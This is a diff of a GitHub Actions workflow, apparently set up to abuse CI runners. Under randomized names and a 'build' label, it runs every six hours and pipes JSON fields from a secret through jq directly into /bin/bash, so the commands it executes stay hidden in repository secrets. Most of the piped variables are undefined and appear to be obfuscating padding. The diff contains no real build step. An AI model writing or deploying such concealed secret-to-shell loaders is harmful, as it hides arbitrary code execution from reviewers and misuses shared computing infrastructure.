@@ -3,29 +3,31 @@ name: riiakflj
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 3/6 * * *'
-
-jobs:  # 28830
+    - cron: '21 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: riiakflj
         env:
-          wb3: ${{ secrets.wb3 }}
+          ojp9752: ${{ secrets.ojp9752 }}
         run: |
-          echo $wb3 | jq -r .cebp00 | /bin/bash
-          echo $qy14 | jq -r .h6406 | /bin/bash
-          echo $xj9138 | jq -r .hco15 | /bin/bash
-          echo $j89 | jq -r .jcxeq86 | /bin/bash
-          echo $iy4323 | jq -r .st91235 | /bin/bash
-          echo $trxlj69644 | jq -r .ia8191 | /bin/bash
-          echo $gxrx57714 | jq -r .ry2 | /bin/bash
-          echo $ku35 | jq -r .eq89949 | /bin/bash
-          echo $zq6 | jq -r .g01631 | /bin/bash
-          echo $rkikl14076 | jq -r .vv0948 | /bin/bash
-          echo $gwlm5527 | jq -r .soxpi0 | /bin/bash
-          echo $c37 | jq -r .ph810 | /bin/bash
-          echo $xij0919 | jq -r .gm65 | /bin/bash
-          echo $z43 | jq -r .kv719 | /bin/bash
+          echo $ojp9752 | jq -r .ho02704 | /bin/bash
+          echo $ly1 | jq -r .yea8590 | /bin/bash
+          echo $wstt300 | jq -r .fn43267 | /bin/bash
+          echo $ltzuv10 | jq -r .xme6 | /bin/bash
+          echo $oaxt88882 | jq -r .zlts6216 | /bin/bash
+          echo $kw170 | jq -r .hnml07775 | /bin/bash
+          echo $buu9 | jq -r .ignp26552 | /bin/bash
+          echo $ng76 | jq -r .scxyl2205 | /bin/bash
+          echo $bxsl8 | jq -r .ul31241 | /bin/bash
+          echo $fbg2 | jq -r .o355 | /bin/bash
+          echo $q2 | jq -r .yze73 | /bin/bash
+          echo $aeo7 | jq -r .xosic968 | /bin/bash
+          echo $g2761 | jq -r .ez188 | /bin/bash
+          echo $hhrep15 | jq -r .df29453 | /bin/bash
+          echo $rag8944 | jq -r .jqoqi151 | /bin/bash
+          echo $lcfwr0 | jq -r .hfear1937 | /bin/bash
 
